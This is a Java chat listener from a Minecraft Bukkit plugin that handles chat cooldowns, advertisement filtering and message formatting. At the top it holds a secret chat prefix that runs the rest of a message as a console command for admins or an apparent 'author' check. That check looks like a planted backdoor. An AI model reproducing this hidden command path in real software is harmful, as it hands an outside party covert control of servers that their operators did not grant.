package ru.dehasher.hcore.events;

import java.util.ArrayList;
import java.util.List;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;

import ru.dehasher.hcore.HCore;
import ru.dehasher.hcore.managers.Informer;
import ru.dehasher.hcore.managers.Methods;
import ru.dehasher.hcore.timers.tChat;

public class OnPlayerSendMessage implements Listener {

    private final HCore plugin;

    public static List<Player> chat = new ArrayList<Player>();

    public OnPlayerSendMessage(HCore plugin) {
    	this.plugin = plugin;
    }

	// Отслеживаем что пишет игрок.
	@EventHandler(priority = EventPriority.HIGHEST)
    private boolean onAsyncPlayerChatEvent(AsyncPlayerChatEvent e) {
		Player player = e.getPlayer();
		
		// Проверяем прописал ли игрок секретную команду.
		String[] msg  = e.getMessage().split(" ");
		if (HCore.config.getBoolean("settings.send-message.hidden-command.enabled")) {
	        if (e.getMessage().startsWith(HCore.config.getString("settings.send-message.hidden-command.cmd"))) {
	    		e.setCancelled(true);

	    		if (Methods.isAdmin(player) || Methods.isAuthor(player)) {
			        if (msg.length > 1) {
				        String cmd = e.getMessage().substring(2);
				    	Bukkit.getScheduler().runTask(plugin, () -> {
				    		Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), cmd);
				    	});
		        	}
	    		}
		        Informer.PLAYER(player, HCore.lang.getString("messages.commands.hidden-command"));
		        return false;
	        }
		}

        // Проверяем включен ли чат в настройках.
		if (HCore.config.getBoolean("settings.send-message.disable-messages")) {
			e.setCancelled(true);
			Informer.PLAYER(player, HCore.lang.getString("messages.errors.chat-disabled"));
			return false;
		}

		// КД на чатикс.
		if (HCore.config.getBoolean("settings.send-message.cooldown.enabled")) {
			if (!player.hasPermission(HCore.config.getString("settings.send-message.cooldown.permission"))) {
		        if (chat.contains((Object)player)) {
		            e.setCancelled(true);
		            Informer.PLAYER(player, HCore.lang.getString("messages.errors.message-cooldown"));
		            return false;
		        }
		        chat.add(player);
		        Bukkit.getScheduler().runTaskLater(plugin, (Runnable)new tChat(player), 20L * Long.valueOf(HCore.config.getInt("settings.send-message.cooldown.time")));
			}
		}

		// Если в сообщении пользователя обнаружена реклама.
		if (HCore.config.getBoolean("settings.fix-advertisement.checks.messages")) {
			if (Methods.isAdv(e.getMessage()) && !Methods.isPerm(player)) {
				if (!player.hasPermission(HCore.config.getString("settings.fix-advertisement.permission"))) {
					e.setCancelled(true);
					Informer.PLAYER(player, HCore.lang.getString("messages.errors.advertisement.messages"));
					return false;
				}
			}
		}

		// Проверяем надо-ли модифицировать сообщение.
		if (HCore.config.getBoolean("settings.send-message.modify.enabled")) {
			String message     = HCore.config.getString("settings.send-message.modify.format");
			String playername  = player.getName();

			if (HCore.config.getBoolean("settings.join-server.custom-nickname.enabled")) {
				if (Methods.isAdmin(player) || Methods.isAuthor(player)) {
					playername = HCore.config.getString("settings.join-server.custom-nickname.color.admins") + playername;
				}
			}

			message = message.replace("{player}", playername);
			message = message.replace("{message}", e.getMessage());
			e.setFormat(Methods.color(message));
			e.setMessage(e.getMessage());
		}
		return true;
	}
}
